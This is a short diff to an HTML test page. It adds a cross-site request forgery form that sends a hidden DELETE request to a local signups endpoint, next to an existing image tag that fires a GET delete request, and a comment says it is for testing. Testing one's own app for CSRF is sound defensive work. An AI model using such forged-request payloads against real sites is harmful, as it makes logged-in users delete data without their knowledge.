@@ -5,6 +5,12 @@
 </head>
 <body>
     <img src="http://localhost:8080/signups/delete/1">
+
+    <!-- This form allows testing for CSRF when the delete method is used to delete signups. -->
+    <form action="http://localhost:8080/signups/delete/1" method="post">
+        <input type="submit" value="Delete CSRF attack">
+        <input type="hidden" name="_method" value="delete">
+    </form>
     <span>Hello world</span>
 </body>
 </html>
